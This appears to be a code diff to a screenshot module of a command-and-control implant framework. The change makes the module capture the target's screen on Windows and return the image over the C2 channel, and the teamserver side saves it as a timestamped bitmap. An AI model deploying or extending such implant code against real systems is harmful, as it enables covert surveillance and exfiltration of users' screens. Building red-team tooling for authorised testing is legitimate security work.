@@ -1,10 +1,15 @@
 #include "ScreenShot.hpp"
 
+#ifdef _WIN32
 // https://github.com/apriorit/Screenshot_Desktop/tree/master
 #include "ScreenShooter.h"
+#endif
+
 #include "Common.hpp"
 
 #include <cstring>
+#include <chrono>
+#include <sstream>
 
 using namespace std;
 
@@ -13,21 +18,19 @@ using namespace std;
 constexpr std::string_view moduleName = "screenShot";
 constexpr unsigned long long moduleHash = djb2(moduleName);
 
-#ifdef _WIN32
 
+#ifdef _WIN32
 __declspec(dllexport) ScreenShot* ScreenShotConstructor() 
 {
     return new ScreenShot();
 }
-
 #else
-
 __attribute__((visibility("default"))) ScreenShot* ScreenShotConstructor() 
 {
     return new ScreenShot();
 }
-
 #endif
+
 
 ScreenShot::ScreenShot()
 #ifdef BUILD_TEAMSERVER
@@ -38,13 +41,16 @@ ScreenShot::ScreenShot()
 {
 }
 
+
 ScreenShot::~ScreenShot()
 {
 }
 
+
 std::string ScreenShot::getInfo()
 {
 	std::string info;
+	// TODO: add screenshot every x seconds with a recurringExec
 #ifdef BUILD_TEAMSERVER
 	info += "ScreenShot:\n";
 	info += "ScreenShot\n";
@@ -54,21 +60,13 @@ std::string ScreenShot::getInfo()
 	return info;
 }
 
+
 int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
-	if (splitedCmd.size() >= 2 )
+	if (splitedCmd.size() >= 1 )
 	{
-		string inputFile;
-		for (int idx = 1; idx < splitedCmd.size(); idx++) 
-		{
-			if(!inputFile.empty())
-				inputFile+=" ";
-			inputFile+=splitedCmd[idx];
-		}
-
-		c2Message.set_instruction(splitedCmd[0]);
-		c2Message.set_inputfile(inputFile);
+		c2Message.set_instruction(splitedCmd[0]);	
 	}
 	else
 	{
@@ -82,32 +80,20 @@ int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 #define ERROR_OPEN_FILE 1 
 
-void SaveVectorToFile(const std::wstring& fileName, const std::vector<unsigned char>& data)
-{
-    HANDLE hFile = CreateFileW(fileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
-    if(hFile == INVALID_HANDLE_VALUE)
-		throw std::logic_error("SaveVectorToFile : can't open file ");
-    guards::CHandleGuard fileGuard(hFile);
-    DWORD bytesWriten = 0;
-	if(!WriteFile(hFile, &data[0], (DWORD)data.size(), &bytesWriten, 0))
-		throw std::logic_error("SaveVectorToFile : can't write to file ");
-}
 
 int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
 	c2RetMessage.set_instruction(c2RetMessage.instruction());
 
-	std::cout << "ScreenShot " << std::endl;
-
-
+#ifdef _WIN32
 	std::vector<unsigned char> dataScreen;
     ScreenShooter::CaptureScreen(dataScreen);
 
-	const wchar_t* filename = L"test.bmp";
-    SaveVectorToFile(filename, dataScreen);
+	std::string buffer(dataScreen.begin(), dataScreen.end());
+	c2RetMessage.set_data(buffer);
 
-	std::string buffer;
-	c2RetMessage.set_returnvalue(buffer);
+	c2RetMessage.set_returnvalue("Success");
+#endif	
 
 	return 0;
 }
@@ -123,5 +109,51 @@ int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& error
 			errorMsg = "Failed: Couldn't open file";
 	}
 #endif
+	return 0;
+}
+
+
+std::string getFilenameTimestamp() 
+{
+    auto now = std::chrono::system_clock::now();
+    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
+
+    std::tm local_time;
+#ifdef _WIN32
+    localtime_s(&local_time, &now_time);
+#else
+    localtime_r(&now_time, &local_time);
+#endif
+
+    // Format the timestamp
+    std::ostringstream oss;
+    oss << std::put_time(&local_time, "%Y%m%d_%H%M%S");
+    return oss.str();
+}
+
+
+int ScreenShot::recurringExec(C2Message& c2RetMessage) 
+{
+	// TODO
+	
+	return 1;
+}
+
+
+// TODO save the screenshot in a pre defined directory
+int ScreenShot::followUp(const C2Message &c2RetMessage)
+{
+#ifdef BUILD_TEAMSERVER
+	const std::string buffer = c2RetMessage.data();
+
+	if(buffer.size()>0)
+	{
+		std::string outputFile = "screenShot" + getFilenameTimestamp() + ".bmp";
+		std::ofstream output(outputFile, std::ios::binary);
+		output << buffer;
+		output.close();
+	}
+#endif
+
 	return 0;
 }
